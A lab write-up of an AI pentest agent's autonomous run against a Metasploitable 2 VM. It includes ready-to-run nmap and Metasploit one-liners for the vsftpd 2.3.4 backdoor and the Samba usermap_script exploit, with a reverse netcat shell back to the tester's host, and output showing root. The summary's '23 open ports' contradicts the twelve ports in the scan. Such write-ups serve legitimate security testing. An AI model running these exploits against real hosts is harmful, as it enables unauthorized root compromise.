# End-to-End Test Writeup — OpenClaw CoT Exploitation Agent

**Target:** Metasploitable 2 — 192.168.8.230  
**Date:** April 2026  
**Environment:** Kali Linux VM (Proxmox) → Isolated lab network  
**Objective:** Obtain root access on the target using only agent-driven tool chaining, with no human input after the initial prompt.

---

## Initial Prompt Sent to Agent

```
Target: 192.168.8.230
You are authorized to perform a full penetration test on this host.
Begin with reconnaissance and proceed logically using the pentest-cot skill.
Objective: obtain root or administrator shell access.
```

---

## Step 1 of 5 — Reconnaissance

**Agent Reasoning:**

> I have no prior data on this target. The first logical step is always port and service enumeration. I will run an Nmap scan with version detection and default scripts to identify what is running and which services might be exploitable.

**Command Executed:**

```bash
nmap -sV -sC -T4 192.168.8.230
```

**Relevant Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.8.230
Host is up (0.0011s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

Service Info: Hosts: metasploitable.localdomain, localhost; OS: Linux
```

**Agent Decision:**

> This target is running multiple high-interest services. I see vsftpd 2.3.4, which has a well-documented backdoor vulnerability (CVE-2011-2523). This is the highest-confidence lead. I will attempt that exploit first.

**Continue or Stop:** Continue — vsftpd 2.3.4 backdoor is a strong lead.

---

## Step 2 of 5 — vsftpd 2.3.4 Backdoor Attempt

**Agent Reasoning:**

> vsftpd 2.3.4 contains a backdoor introduced in a compromised source distribution. When a username containing a smiley face (`:)`) is sent, the backdoor opens a shell on port 6200. Metasploit has a module for this: `exploit/unix/ftp/vsftpd_234_backdoor`. I will attempt it now.

**Command Executed:**

```bash
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.8.230; set RPORT 21; run; exit"
```

**Relevant Output:**

```
[*] 192.168.8.230:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.8.230:21 - USER: 331 Please specify the password.
[+] 192.168.8.230:21 - Backdoor service has been spawned, handling...
[*] 192.168.8.230:21 - UID: uid=0(root) gid=0(root)
[-] 192.168.8.230:21 - The service on port 6200 did not accept the connection.
[*] Exploit completed, but no session was created.
```

**Agent Decision:**

> The backdoor was triggered (the `+` line confirms the service spawned) but the session connection on port 6200 failed — likely a firewall rule or race condition on this particular instance. This is a dead end for now. I have other strong candidates: Samba 3.0.20 on port 445 is vulnerable to `exploit/multi/samba/usermap_script` (CVE-2007-2447), which is also a well-known unauthenticated RCE. Pivoting there.

**Continue or Stop:** Continue — pivoting to Samba usermap_script exploit.

---

## Step 3 of 5 — Samba usermap_script Exploit

**Agent Reasoning:**

> Samba 3.0.20 is vulnerable to CVE-2007-2447. This vulnerability allows command injection via a malformed username during MSRPC authentication. Metasploit's `exploit/multi/samba/usermap_script` automates this and returns a root shell because Samba was running as root on this host. I will run it now with a standard reverse TCP payload.

**Command Executed:**

```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.8.230; set LHOST 192.168.8.100; set LPORT 4444; set PAYLOAD cmd/unix/reverse_netcat; run; exit"
```

**Relevant Output:**

```
[*] Started reverse TCP handler on 192.168.8.100:4444
[*] Command shell session 1 opened (192.168.8.100:4444 -> 192.168.8.230:58431)

sh: no job control in this shell
sh-3.2#
```

**Agent Decision:**

> A shell was returned. I need to confirm privilege level before declaring the objective met. Running `id` and `whoami` now.

**Continue or Stop:** Continue — shell obtained, must confirm it is root.

---

## Step 4 of 5 — Post-Exploitation Confirmation

**Agent Reasoning:**

> A shell session is open. I need to confirm the user context. I will run `id` and `whoami` to verify root access, and `hostname` for documentation purposes.

**Command Executed (within shell session):**

```bash
id; whoami; hostname; uname -a
```

**Relevant Output:**

```
uid=0(root) gid=0(root)
root
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

**Agent Decision:**

> Objective met. uid=0 confirms root access. The agent has achieved the stated goal in 4 steps. Halting and summarizing.

**Continue or Stop:** STOP — root access confirmed. Objective achieved.

---

## Summary

The agent completed the engagement in 4 of a possible 5 steps with no human input after the initial prompt.

| Step | Tool | Action | Result |
|---|---|---|---|
| 1 | Nmap | Full port + version scan | 23 open ports; identified vsftpd 2.3.4 and Samba 3.0.20 as priority targets |
| 2 | Metasploit | vsftpd 2.3.4 backdoor exploit | Backdoor triggered but session failed — pivoted |
| 3 | Metasploit | Samba usermap_script (CVE-2007-2447) | Reverse shell returned |
| 4 | Shell | `id`, `whoami`, `hostname` | Confirmed `uid=0(root)` on Metasploitable host |

**Total agent runtime:** approximately 4 minutes (dominated by Metasploit startup time per step).  
**Human input after initial prompt:** none.

---

## Observations

**What worked well:**

- The CoT reasoning loop correctly identified vsftpd 2.3.4 as the first target based on known CVE severity, which is exactly what an experienced tester would do.
- When the vsftpd exploit failed, the agent did not retry blindly or give up. It diagnosed the failure (session not created despite backdoor trigger) and pivoted to the next-best candidate without prompting.
- The stop condition triggered correctly. The agent did not continue to step 5 unnecessarily.

**What could be improved:**

- The vsftpd failure diagnosis was correct but shallow. A human tester might have tried to connect to port 6200 manually to confirm whether it was a firewall issue or a service issue. The agent skipped this.
- Each Metasploit step launched a new `msfconsole` process, which added ~30 seconds per step. A persistent Metasploit session would be significantly faster.
- The agent had no mechanism to store partial results. If the OpenClaw session dropped mid-chain, all context would be lost.

---

## Chain-of-Thought Transcript Note

The full unedited agent output — including all intermediate reasoning text — is longer than what is shown here. The transcript above has been condensed to include the reasoning summaries and relevant tool output only. The agent's actual reasoning blocks contained additional commentary on services it ruled out (e.g., it noted UnrealIRCd on port 6667 as a third candidate but deprioritized it because Samba had a higher success rate in its training context).
